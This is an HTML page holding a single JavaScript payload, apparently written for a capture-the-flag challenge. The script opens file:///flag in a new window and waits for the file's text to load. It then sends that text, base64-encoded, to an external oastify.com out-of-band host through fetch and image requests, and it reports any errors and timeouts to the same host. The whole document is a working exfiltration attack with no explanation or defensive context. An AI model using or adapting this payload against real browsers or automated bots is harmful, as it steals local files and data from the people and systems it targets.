<!doctype html>
<html>
<body>
<script>
(async function(){
  const OAST = "https://g7ojoo6wfdb8f0dltts12kjkzb52t5hu.oastify.com";
  function ex(txt){ try{ const q="?d="+btoa(txt); fetch(OAST+q,{mode:'no-cors'}).catch(()=>{}); new Image().src = OAST+q;}catch(e){} }

  try {
    // open the file in a new window/tab
    const w = window.open("file:///flag","_blank");
    if(!w){
      ex("ERR_POPUP_BLOCKED");
      return;
    }

    // poll for content (try for up to ~6s)
    const start = Date.now();
    const interval = setInterval(()=>{
      try {
        if (w && w.document && w.document.body && w.document.body.innerText) {
          const t = w.document.body.innerText;
          ex("FLAG:"+t);
          clearInterval(interval);
          try { w.close(); } catch(e){}
        }
      } catch(e) {
        // cross-origin or not ready â€” keep trying until timeout
      }
      if (Date.now() - start > 6000) { clearInterval(interval); ex("TIMEOUT"); try{ w.close(); }catch(e){} }
    }, 300);
  } catch(e){
    ex("ERR:"+e);
  }

})();
</script>
</body>
</html>
